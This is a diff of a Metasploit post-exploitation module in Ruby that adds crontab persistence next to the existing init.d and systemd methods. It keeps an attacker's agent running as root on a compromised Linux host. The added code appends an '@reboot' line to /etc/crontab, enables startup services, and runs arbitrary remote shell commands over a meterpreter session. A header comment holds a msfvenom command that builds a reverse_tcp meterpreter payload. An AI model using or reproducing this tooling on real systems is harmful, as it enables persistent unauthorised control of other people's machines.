@@ -27,11 +27,14 @@
 # The session number to run this module on        => set SESSION 3
 # The full remote path of binary to execute       => set REMOTE_PATH /root/agent
 # Time to wait for the agent to start             => set START_TIME 15
+# Use 'init.d' to persiste our payload?           => set INITD true
+# Use 'systemd' to persiste our payload?          => set SYSTEMD true
+# Use 'crontab' to persiste our payload?          => set CRONTAB true
 # The full remote path of init.d directory        => set INIT_PATH /etc/init.d
+# The full remote path of crontab directory       => set CRON_PATH /etc/crontab
+# The full remote path of systemd directory       => set RPATH_SYSTEMD /etc/systemd/system
 # Delete persistence script/configurations        => set DEL_PERSISTENCE true
 # Execute one simple remote bash command          => set SINGLE_COM uname -a
-# Use 'systemd' insted of 'init.d' to persiste    => set SYSTEMD true
-# The full remote path of systemd directory       => set RPATH_SYSTEMD /etc/systemd/system
 # Use agents with shebang? (eg #!/usr/bin/python) => set SHEBANG true
 # ---
 # If sellected 'SHEBANG true' then agent execution will be based on is shebang
@@ -49,7 +52,7 @@
 #
 #
 # [ BUILD AGENT TO TEST (without-shebang) ]
-# msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.67 LPORT=666 -f elf -o agent.elf
+# msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.71 LPORT=666 -f elf -o agent.elf
 #
 #
 # [ LOAD/USE AUXILIARY ]
@@ -90,6 +93,7 @@ class MetasploitModule < Msf::Post
       Rank = GreatRanking
 
   include Msf::Post::File
+  include Msf::Post::Unix
   include Msf::Post::Linux::Priv
   include Msf::Post::Linux::System
 
@@ -102,7 +106,7 @@ class MetasploitModule < Msf::Post
                 super(update_info(info,
                         'Name'          => 'Linux Kali init.d persistence post-module',
                         'Description'   => %q{
-                                        Builds 'persistance' init.d startup script that allow users to persiste your agent (executable) on Linux distros at every startup. This post-module requires the agent allready deployed on target system and accepts any 'linux' chmoded agents (elf|sh|py|rb|pl) to be auto-executed at startup. This module also accepts shebang agents (eg #!/usr/bin/python) and allow users to use 'systemd' (advanced option) as an alternative way to persiste your agent.
+                                        Builds 'persistance' init.d startup script that allow users to persiste your agent (executable) on Linux distros at every startup. This post-module requires the agent allready deployed on target system and accepts any 'linux' chmoded agents (elf|sh|py|rb|pl) to be auto-executed at startup. This module also accepts shebang agents (eg #!/usr/bin/python) and allow users to use 'systemd' or 'crontab' as an alternative way to persiste your agent.
                         },
                         'License'       => UNKNOWN_LICENSE,
                         'Author'        =>
@@ -110,7 +114,7 @@ class MetasploitModule < Msf::Post
                                         'Module Author: pedr0 Ubuntu [r00t-3xp10it]', # post-module author
                                 ],
  
-                        'Version'        => '$Revision: 1.7',
+                        'Version'        => '$Revision: 1.8',
                         'DisclosureDate' => 'jun 2 2017',
                         'Platform'       => 'linux',
                         'Arch'           => 'x86_x64',
@@ -119,7 +123,7 @@ class MetasploitModule < Msf::Post
                                 [
                                          [ 'Linux' ]
                                 ],
-                        'DefaultTarget'  => '1', # default its to run againts Kali 2.0
+                        'DefaultTarget'  => '1', # default its to run againts linux
                         'References'     =>
                                 [
                                          [ 'URL', 'http://goo.gl/ny69NS' ],
@@ -132,8 +136,9 @@ class MetasploitModule < Msf::Post
 				{
                                          'SESSION' => '1',             # Default its to run againts session 1
                                          'START_TIME' => '8',          # Default time (sec) to start remote agent
+                                         'CRON_PATH' => '/etc/crontab',# Default crontab directory  full path
                                          'INIT_PATH' => '/etc/init.d', # Default init.d remote directory full path
-                                         'RPATH_SYSTEMD' => '/etc/systemd/system', # Default systemd directory 
+                                         'RPATH_SYSTEMD' => '/etc/systemd/system', # Default systemd directory full path
 				},
                         'SessionTypes'   => [ 'meterpreter' ]
  
@@ -142,17 +147,20 @@ class MetasploitModule < Msf::Post
                 register_options(
                         [
                                 OptString.new('SESSION', [ true, 'The session number to run this module on']),
+                                OptBool.new('INITD', [ false, 'Use init.d to persiste our payload?' , false]),
+                                OptBool.new('SYSTEMD', [ false, 'Use systemd to persiste our payload?' , false]),
+                                OptBool.new('CRONTAB', [ false, 'Use crontab to persiste our payload?' , false]),
                                 OptString.new('START_TIME', [ false, 'Time to wait for the agent to start (in seconds)']),
-                                OptString.new('REMOTE_PATH', [ false, 'The full remote path of binary to execute (eg /root/agent)'])
+                                OptString.new('REMOTE_PATH', [ false, 'The full remote path of binary to execute (eg /root/agent.sh)'])
                         ], self.class)
 
                 register_advanced_options(
                         [
-                                OptString.new('SINGLE_COM', [ false, 'Execute one simple command (eg uname -a)']),
                                 OptBool.new('SHEBANG', [ false, 'Use agents with [shebang]? (eg #!/bin/sh)' , false]),
+                                OptString.new('SINGLE_COM', [ false, 'Execute one simple bash command (eg uname -a)']),
                                 OptBool.new('DEL_PERSISTENCE', [ false, 'Delete persistence script/configurations?' , false]),
-                                OptBool.new('SYSTEMD', [ false, 'Use systemd insted of init.d to persiste our agent?' , false]),
                                 OptString.new('RPATH_SYSTEMD', [ false, 'The full remote path of systemd directory']),
+                                OptString.new('CRON_PATH', [ false, 'The full remote path of crontab directory']),
                                 OptString.new('INIT_PATH', [ false, 'The full remote path of init.d directory'])
                         ], self.class) 
 
@@ -160,60 +168,66 @@ class MetasploitModule < Msf::Post
 
 
 
-#
-# Build remote init.d persistence script ..
-#
+# ---------------------------------------------------
+# Build persistence on remote system ..
+# ---------------------------------------------------
 def ls_stage1
 
   session = client
-  rem = session.sys.config.sysinfo
-  init = datastore['INIT_PATH']          # /etc/init.d
+  sysnfo = session.sys.config.sysinfo
   stime = datastore['START_TIME']        # 8 (sec to start the agent)
   remote_path = datastore['REMOTE_PATH'] # /root/agent
-  script_check = "#{init}/persistance"   # /etc/init.d/persistance
   #
   # check for proper config settings enter
   # to prevent 'unset all' from deleting default options ..
   #
-  if datastore['REMOTE_PATH'] == 'nil'
-    print_error("Options not configurated correctly ..")
-    print_warning("Please set REMOTE_PATH option!")
+  if datastore['REMOTE_PATH'] == 'nil' || datastore['REMOTE_PATH'] == ''
+    print_error("Options not configurated correctly.")
+    print_warning("Please set REMOTE_PATH option.")
     return nil
   else
-    print_status("Persist: #{remote_path} ..")
+    print_status("Persist: #{remote_path} on #{sysnfo['Computer']}")
     Rex::sleep(1.0)
   end
 
 
-#
-# Use 2º alternative method (systemd service creation)
-#
-if datastore['SYSTEMD'] == true
 
-  serv_path = datastore['RPATH_SYSTEMD'] #/etc/systemd/system
-  serv_file = "#{serv_path}/persistence.service"
+# ---------------------------------------------------
+# Using systemd service creation
+# ---------------------------------------------------
+if datastore['SYSTEMD'] == true && datastore['DEL_PERSISTENCE'] == false
+
+# prevent other pesistence functions from runing.
+if datastore['INITD'] == true || datastore['CRONTAB'] == true
+  print_error("[ERROR] unset INITD and CRONTAB")
+  print_warning("we can only run one persistence technic.")
+  return nil
+end
     #
     # Check if persistence its allready active ..
     #
+    serv_path = datastore['RPATH_SYSTEMD'] #/etc/systemd/system
+    serv_file = "#{serv_path}/persistence.service"
     if session.fs.file.exist?(serv_file)
-      print_error("systemd: #{serv_file} found ..")
-      print_error("Post-module reports that persistence its active ..")
+      print_error("systemd: #{serv_file} found.")
+      print_warning("Post-module reports that persistence its active.")
       return nil
     end
     #
     # Check if agent its deployed (remote) ..
     #
-    if not session.fs.file.exist?(remote_path)
-      print_error("agent: #{remote_path} not found ..")
-      print_error("Please upload your agent before running this funtion ..")
+    unless session.fs.file.exist?(remote_path)
+      print_error("agent: #{remote_path} not found.")
+      print_warning("Please upload your agent before running this funtion.")
       return nil
+    else
+      print_status("Remote agent full path found.")
     end
-    print_status("Remote agent full path found ..")
 
       #
       # This is the systemd script that provides persistence on startup ..
       #
-      print_warning("Writing systemd persistence startup script ..")
+      print_status("Writing systemd persistence startup script.")
       Rex::sleep(1.0)
 
       systemd_data =
@@ -235,48 +249,68 @@ if datastore['SYSTEMD'] == true
       # Config systemd startup service (chmod + daemon-reload + systemctl enable)
       #
       if session.fs.file.exist?(serv_file)
-        print_status("Config systemd persistence script ..")
+        print_status("Config systemd persistence script.")
         cmd_exec("chmod 664 #{serv_file}")
         Rex::sleep(1.0)
-        print_status("Reloading systemctl daemon ..")
+        print_status("Reloading systemctl daemon.")
         cmd_exec("systemctl daemon-reload")
         Rex::sleep(1.0)
-        print_status("Enable systemctl service ..")
+        print_status("Enable systemctl service.")
         cmd_exec("systemctl enable persistence.service")
         Rex::sleep(1.5)
+        #
+        # final displays to user
+        #
+        print_good("Persistence achieved on: #{sysnfo['Computer']}")
+        Rex::sleep(1.0)
+        print_warning("To start service: systemctl start persistence.service")
+        Rex::sleep(1.0)
       else
-        print_error("systemd script: #{serv_file} not found ..")
-        print_error("Persistence on: #{rem['Computer']} not achieved ..")
+        print_error("systemd script: #{serv_file} not found.")
+        print_warning("Persistence on: #{sysnfo['Computer']} not achieved.")
         return nil
       end
+end
 
 
-else
 
+# ---------------------------------------------------
+# use init.d service creation
+# ---------------------------------------------------
+if datastore['INITD'] == true && datastore['DEL_PERSISTENCE'] == false
 
+# prevent other pesistence functions from runing.
+if datastore['SYSTEMD'] == true || datastore['CRONTAB'] == true
+  print_error("[ERROR] unset SYSTEMD and CRONTAB")
+  print_warning("we can only run one persistence technic.")
+  return nil
+end
     #
     # Check if persistence its allready active ..
     #
+    init = datastore['INIT_PATH']          # /etc/init.d
+    script_check = "#{init}/persistance"   # /etc/init.d/persistance
     if session.fs.file.exist?(script_check)
-      print_error("init.d: #{script_check} found ..")
-      print_error("Post-module reports that persistence its active ..")
+      print_error("init.d: #{script_check} found.")
+      print_warning("Post-module reports that persistence its active.")
       return nil
     end
     #
     # Check if agent its deployed (remote) ..
     #
-    if not session.fs.file.exist?(remote_path)
-      print_error("agent: #{remote_path} not found ..")
-      print_error("Please upload your agent before running this funtion ..")
+    unless session.fs.file.exist?(remote_path)
+      print_error("agent: #{remote_path} not found.")
+      print_warning("Please upload your agent before running this funtion.")
       return nil
+    else
+      print_status("Remote agent full path found.")
     end
-    print_status("Remote agent full path found ..")
 
     #
     # Sellect how agent will execute (in persistence script call)
     #
     if datastore['SHEBANG'] == true
-    print_status("Agent with shebang sellected ..")
+    print_warning("Agent with shebang sellected.")
       #
       # If used agents with SHEBANG (eg #!/usr/bin/python)
       # TODO: Check Extensions execution using bash ( elf | sh | py | rb | pl ) 
@@ -297,9 +331,9 @@ else
         print_status("Agent extension sellected: perl")
         trigger = "perl "
       else
-        print_error("Agent extension not supported ..")
-        print_error("Please use [sh|elf|py|rb|pl] agent extensions ..")
-        print_error("OR set 'SHELBANG false' to execute agent: ./root/agent")
+        print_error("Agent extension not supported.")
+        print_warning("Please use [sh|elf|py|rb|pl] agent extensions.")
+        print_warning("OR set 'SHELBANG false' to execute agent: ./root/agent")
         return nil
       end
     #
@@ -313,7 +347,7 @@ else
       #
       # This is the init.d script that provides persistence on startup ..
       #
-      print_warning("Writing init.d persistence startup script ..")
+      print_status("Writing init.d persistence startup script.")
       Rex::sleep(1.0)
 
       initd_data =
@@ -342,33 +376,74 @@ else
       # Config init.d startup service (chmod + update-rc.d)
       #
       if session.fs.file.exist?(script_check)
-        print_status("Config init.d persistence script ..")
+        print_status("Config init.d persistence script.")
         cmd_exec("chmod 755 #{script_check}")
         Rex::sleep(1.0)
-        print_status("Update init.d service status (symlinks) ..")
+        print_status("Update init.d service status (symlinks).")
         # update-rc.d persistance defaults # 97 03
         cmd_exec("update-rc.d persistance defaults")
         Rex::sleep(1.5)
+        # final displays
+        print_good("Persistence achieved on: #{sysnfo['Computer']}")
+        Rex::sleep(1.0)
       else
-        print_error("init.d script: #{script_check} not found ..")
-        print_error("Persistence on: #{rem['Computer']} not achieved ..")
+        print_error("init.d script: #{script_check} not found.")
+        print_warning("Persistence on: #{sysnfo['Computer']} not achieved.")
         return nil
       end
-
 end
 
+
+
+# ---------------------------------------------------
+# use crontab service ceation
+# ---------------------------------------------------
+if datastore['CRONTAB'] == true && datastore['DEL_PERSISTENCE'] == false
+
+# prevent other pesistence functions from runing.
+if datastore['INITD'] == true || datastore['SYSTEMD'] == true
+  print_error("[ERROR] unset INITD and SYSTEMD")
+  print_warning("we can only run one persistence technic.")
+  return nil
+end
     #
-    # Final displays to user ..
+    # Check if crontab dir exists ..
     #
-    if datastore['SYSTEMD'] == true
-      print_good("Persistence achieved on: #{rem['Computer']}")
-      Rex::sleep(1.0)
-      print_warning("To start service: systemctl start persistence.service")
-      Rex::sleep(1.0)
+    sysnfo = session.sys.config.sysinfo
+    serv_file = datastore['CRON_PATH'] # /etc/crontab
+    if session.fs.file.exist?(serv_file)
+      print_status("path: #{serv_file} found.")
     else
-      print_good("Persistence achieved on: #{rem['Computer']}")
-      Rex::sleep(1.0)
+      print_error("path #{serv_file} not found.")
+      return nil
     end
+    #
+    # Check if agent its deployed (remote) ..
+    #
+    unless session.fs.file.exist?(remote_path)
+      print_error("agent: #{remote_path} not found.")
+      print_warning("Please upload your agent before running this funtion.")
+      return nil
+    else
+      print_status("Remote agent full path found.")
+    end
+
+      #
+      # This is the crontab command that provides persistence on startup ..
+      #
+      print_status("Writing crontab schedule task (on reboot).")
+      Rex::sleep(1.0)
+      cmd_exec("echo \"@reboot * * * * root #{remote_path}\" >> #{serv_file}")
+      print_status("Reloading crontab daemon.")
+      cmd_exec("service cron reload")
+      Rex::sleep(1.0)
+
+    # final displays
+    print_good("Persistence achieved on: #{sysnfo['Computer']}")
+    Rex::sleep(1.0)
+    print_warning("#{remote_path} will execute at reboot.")
+    Rex::sleep(1.0)
+end
 
   #
   # error exception funtion
@@ -381,53 +456,59 @@ end
 
 
 
-#
-# Delete init.d script and confs ..
-#
+# ---------------------------------------------------
+# Delete persistence ..
+# ---------------------------------------------------
 def ls_stage2
 
   session = client
-  rem = session.sys.config.sysinfo
-  init = datastore['INIT_PATH']        # /etc/init.d
-  script_check = "#{init}/persistance" # /etc/init.d/persistance
+  sysnfo = session.sys.config.sysinfo
   #
   # check for proper config settings enter
   # to prevent 'unset all' from deleting default options ..
   #
   if datastore['DEL_PERSISTENCE'] == 'nil'
-    print_error("Options not configurated correctly ..")
+    print_error("Options not configurated correctly.")
     print_warning("Please set DEL_PERSISTENCE option!")
     return nil
   else
-    print_status("Delete startup persistence script ..")
+    print_status("Deleting persistence schedules.")
     Rex::sleep(1.0)
   end
 
 
-#
-# Use 2º alternative method (systemd service creation)
-#
-if datastore['SYSTEMD'] == true
 
-  serv_path = datastore['RPATH_SYSTEMD'] #/etc/systemd/system
-  serv_file = "#{serv_path}/persistence.service"
+# ---------------------------------------------------
+# Deleting systemd service persistence schedules
+# ---------------------------------------------------
+if datastore['SYSTEMD'] == true && datastore['DEL_PERSISTENCE'] == true
+
+# prevent other pesistence functions from runing.
+if datastore['INITD'] == true || datastore['CRONTAB'] == true
+  print_error("[ERROR] unset INITD and CRONTAB")
+  print_warning("we can only run one persistence technic.")
+  return nil
+end
     #
     # Check systemd persiste script existance ..
     #
-    if not session.fs.file.exist?(serv_file)
-      print_error("script: #{serv_file} not found ..")
-      print_error("Post-module reports that none persistence was found ..")
+    serv_path = datastore['RPATH_SYSTEMD'] #/etc/systemd/system
+    serv_file = "#{serv_path}/persistence.service"
+    unless session.fs.file.exist?(serv_file)
+      print_error("script: #{serv_file} not found .")
+      print_warning("Post-module reports that none persistence was found.")
       return nil
+    else
+      print_status("Persistence script full path found.")
     end
-    print_status("Persistence script full path found ..")
 
       #
       # Delete systemd script ..
       #
-      print_status("Removing script from systemd directory ..")
+      print_status("Removing script from systemd directory.")
       cmd_exec("rm -f #{serv_file}")
       Rex::sleep(1.0)
-      print_status("Reloading systemctl daemon process ..")
+      print_status("Reloading systemctl daemon process.")
       cmd_exec("sudo systemctl daemon-reload")
       Rex::sleep(1.5)
 
@@ -435,33 +516,51 @@ if datastore['SYSTEMD'] == true
     # Check systemd persiste script existance (after delete) ..
     #
     if session.fs.file.exist?(serv_file)
-      print_error("script: #{serv_file} not proper deleted ..")
+      print_error("script: #{serv_file} not proper deleted.")
       print_error("Please manually delete : rm -f #{serv_file}")
       print_error("Please manually execute: sudo systemctl daemon-reload")
       return nil
+    else
+      print_good("Persistence deleted from: #{sysnfo['Computer']}")
+      print_warning("This module will NOT delete the agent from target.")
+      Rex::sleep(1.0)
     end
+end
 
 
-else
 
 
+# ---------------------------------------------------
+# Deleting init.d service persistence schedules
+# ---------------------------------------------------
+if datastore['INITD'] == true && datastore['DEL_PERSISTENCE'] == true
+
+# prevent other pesistence functions from runing.
+if datastore['SYSTEMD'] == true || datastore['CRONTAB'] == true
+  print_error("[ERROR] unset SYSTEMD and CRONTAB")
+  print_warning("we can only run one persistence technic.")
+  return nil
+end
     #
     # Check init.d persiste script existance ..
     #
-    if not session.fs.file.exist?(script_check)
-      print_error("script: #{script_check} not found ..")
-      print_error("Post-module reports that none persistence was found ..")
+    init = datastore['INIT_PATH']          # /etc/init.d
+    script_check = "#{init}/persistance"   # /etc/init.d/persistance
+    unless session.fs.file.exist?(script_check)
+      print_error("script: #{script_check} not found.")
+      print_error("Post-module reports that none persistence was found.")
       return nil
+    else
+      print_status("Persistence script full path found.")
     end
-    print_status("Persistence script full path found ..")
 
       #
       # Delete init.d script ..
       #
-      print_status("Deleting persistence service (symlinks) ..")
+      print_status("Deleting persistence service (symlinks).")
       cmd_exec("update-rc.d persistance remove")
       Rex::sleep(1.5)
-      print_status("Removing script from init.d directory ..")
+      print_status("Removing script from init.d directory.")
       cmd_exec("rm -f #{script_check}")
       Rex::sleep(1.0)
 
@@ -469,20 +568,60 @@ else
     # Check init.d persiste script existance (after delete) ..
     #
     if session.fs.file.exist?(script_check)
-      print_error("script: #{script_check} not proper deleted ..")
+      print_error("script: #{script_check} not proper deleted.")
       print_error("Please manually delete : rm -f #{init}/persistance")
       print_error("Please manually execute: update-rc.d persistance remove")
       return nil
+    else
+      print_good("Persistence deleted from: #{sysnfo['Computer']}")
+      print_warning("This module will NOT delete the agent from target.")
+      Rex::sleep(1.0)
     end
-
 end
 
+
+
+# ---------------------------------------------------
+# deleting crontab persistence schedules
+# ---------------------------------------------------
+if datastore['CRONTAB'] == true && datastore['DEL_PERSISTENCE'] == true
+
+# prevent other pesistence functions from runing.
+if datastore['INITD'] == true || datastore['SYSTEMD'] == true
+  print_error("[ERROR] unset INITD and SYSTEMD")
+  print_warning("we can only run one persistence technic.")
+  return nil
+end
     #
-    # Final displays to user ..
+    # Check init.d persiste script existance ..
     #
-    print_good("Persistence deleted from: #{rem['Computer']}")
-    print_warning("This module will NOT delete the agent from target ..")
-    Rex::sleep(1.0)
+    serv_file = datastore['CRON_PATH'] # /etc/crontab
+    unless session.fs.file.exist?(serv_file)
+      print_error("path: #{serv_file} not found.")
+      return nil
+    else
+      print_status("crontab directory full path found.")
+    end
+
+      #
+      # Delete crontab command line on crontab file ..
+      #
+      remote_path = datastore['REMOTE_PATH']
+      print_status("Deleting persistence service (crontab line)")
+      print_warning("remote agent absoluct path: #{remote_path}")
+      Rex::sleep(1.5)
+      print_warning("exec unset all and then use module SINGLE_COM")
+      print_good("set SINGLE_COM sed -i \\'s|@reboot \\\\* \\\\* \\\\* \\\\* root \\\\/root\\\\/payload.sh||\\' #{serv_file}")
+      # remote_path = datastore['REMOTE_PATH'].gsub('/', '\\/')
+      # cmd_exec("sed -i 's|@reboot \* \* \* \* root #{remote_path}||' #{serv_file}")
+      Rex::sleep(1.5)
+
+  # Final displays to user ..
+  # print_good("Persistence deleted from: #{sysnfo['Computer']}")
+  print_status("This module will NOT delete the agent from target.")
+  Rex::sleep(1.0)
+end
+
 
   #
   # error exception funtion
@@ -494,24 +633,24 @@ end
 
 
 
-#
+# ---------------------------------------------------
 # Execute single_command (shell) and return output ..
-#
+# ---------------------------------------------------
 def ls_stage3
 
   session = client
-  rem = session.sys.config.sysinfo
+  sysnfo = session.sys.config.sysinfo
   exe_com = datastore['SINGLE_COM']  # uname -a
   #
   # check for proper config settings enter
   # to prevent 'unset all' from deleting default options ..
   #
   if datastore['SINGLE_COM'] == 'nil'
-    print_error("Options not configurated correctly ..")
+    print_error("Options not configurated correctly.")
     print_warning("Please set SINGLE_COM option!")
     return nil
   else
-    print_status("Executing remote bash command  ..")
+    print_status("Executing remote bash command.")
     Rex::sleep(1.0)
   end
 
@@ -524,21 +663,15 @@ def ls_stage3
       print_line("")
       print_line(output)
       print_line("")
-
-  #
-  # error exception funtion
-  #
-  rescue ::Exception => e
-  print_error("Error: #{e.class} #{e}")
 end
 
 
 
 
-#
+# ---------------------------------------------------
 # MAIN DISPLAY WINDOWS (ALL MODULES - def run)
 # Running sellected modules against session target
-#
+# ---------------------------------------------------
 def run
   session = client
 
@@ -586,7 +719,7 @@ def run
     # check for proper session (meterpreter)
     # the non-return of sysinfo command reveals that we are not on a meterpreter session!
     #
-    if not sysinfo.nil?
+    unless sysinfo.nil? or sysinfo == ''
       print_warning("Running module against: #{sysnfo['Computer']}")
     else
       print_error("[ABORT]: This module only works in meterpreter sessions!")
